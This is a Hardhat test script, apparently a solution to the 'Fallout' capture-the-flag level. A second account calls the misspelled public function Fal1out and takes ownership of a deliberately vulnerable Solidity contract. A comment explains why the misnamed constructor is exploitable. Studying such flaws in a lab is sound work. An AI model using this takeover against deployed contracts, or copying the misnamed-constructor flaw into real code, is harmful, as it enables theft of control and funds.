const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("FallOut", function () {
  async function deployOneYearLockFixture() {
    const [owner, otherAccount] = await ethers.getSigners();

    const FallOut = await ethers.getContractFactory("Fallout");
    const fallOut = await FallOut.deploy();
    await fallOut.deployed();

    return { fallOut, owner, otherAccount };
  }

  describe("Deployment", function () {
    it("Should Become The OWNER - FallOut", async function () {
      const { fallOut, owner, otherAccount } = await loadFixture(
        deployOneYearLockFixture
      );
      const Owner = await fallOut.owner();
      expect(Owner).to.equal(ethers.constants.AddressZero);
      const connectedAccount = fallOut.connect(otherAccount);
      // Fallout is Misspelled as Fal1Out , so it is not the constructor of the contract
      // It is another public fn, whoever calls it can become the owner.
      await connectedAccount.Fal1out({
        value: ethers.utils.parseEther("0.0001"),
      });
      const NewOwner = await fallOut.owner();
      expect(NewOwner).to.equal(otherAccount.address);
      console.log(owner, NewOwner);
    });
  });
});
